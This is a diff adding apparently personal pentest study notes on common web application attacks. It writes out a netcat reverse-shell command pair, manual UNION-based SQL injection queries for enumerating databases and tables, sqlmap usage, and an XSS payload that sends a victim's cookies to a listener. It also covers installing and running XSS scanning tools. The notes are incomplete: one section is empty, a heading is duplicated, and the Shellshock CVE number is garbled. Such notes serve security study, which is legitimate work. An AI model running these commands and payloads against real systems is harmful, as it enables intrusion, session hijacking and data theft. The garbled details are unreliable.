@@ -1,0 +1,74 @@
+############################## COMMON WEBAPP ATTACKS ####################################
+
+## HTTPS SPLITTING : 
+	
+
+
+
+
+## INJECTION :
+1) COMMAND INJECTION: running commands directtly on server machine using unfiltered input field on web page.
+   1.1) setting up reverse shell connection (netcat-traditional)
+	attack machine : nc -lvp <port number> : listens for incoming reverse shell connection
+	victim machine : nc.traditional -e /bin/bash <attack machine ip> <port number>
+
+   1.2) ShellShock : (cve-2014-61742) sends specifically made header(user-agent) to exploit bash shell.
+
+
+## SQL INJECTION :
+  0) SQL injection check : enter ' in input
+  1) MANUAL SQL INJECTION 
+  1.1) check number of columns : <id> ORDER BY <1,2,3..> # until unknown clause error appears
+  1.2) check the order of columns : UNION SELECT <1,2,3...num of columns> #
+  1.3) find database and user name : UNION SELECT DATABASE(),USER() #	
+  1.4) find names of database : UNION SELECT schema_name FROM information_schema.schemata # 
+  1.5) find tables in database : UNION SELECT table_name FROM information_schema.tables WHERE table_schema='<db name>' #
+  1.6) query table columns : UNION SELECT column_name,column_type FROM information_schema.columns where table_schema = '<db name>' AND table_name = '<table name>' 
+  
+  2) AUTOMATED SQL INJECTION
+  2.1) sqlmap:
+	sqlmap --help : shows options
+	sqlmap -u <target url> --schema : retrieve sql database schema 
+
+## XML INJECTION :
+  1) AUTOMATED XML INJECTION
+  1.1) Xcat:
+	pip3 install xcat : installation
+
+
+## CROSS SITE SCRIPTING (XSS)
+  0) XSS CHECK : <script>alert('1')</script>
+  1) MANUAL XSS
+  1.1) cookie hijacking : <script>document.write('<img src="<listener address>/'+document.cookie+'" >')</script>
+  2) AUTOMATED XSS
+  2.1) XSSER
+	2) AUTOMATED XSS
+  2.1) XSSER
+	installation : 
+		wget https://xsser.03c8.net/xsser/xsser_1.8-3.tar.gz
+		tar -zxvf xsser_1.8-3.tar.gz
+		cd xsser
+		python3 setup.py install
+	Get request	
+		xsser -u <domain name> -g <path> : replace fields value in path with XSS 
+		eg 1 : xsser -u http://192.168.1.2 -g '/bodgeit/search.jsp?q=XSS'
+  2.2) XSS-SNIPER
+	installation
+		git clone https://github.com/gbrindisi/xsssniper.git
+	Get request single param 
+		python xsssniper.py -u <url>
+		eg 1 : python xsssniper.py -u "http://target.com/index.php?page=test"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
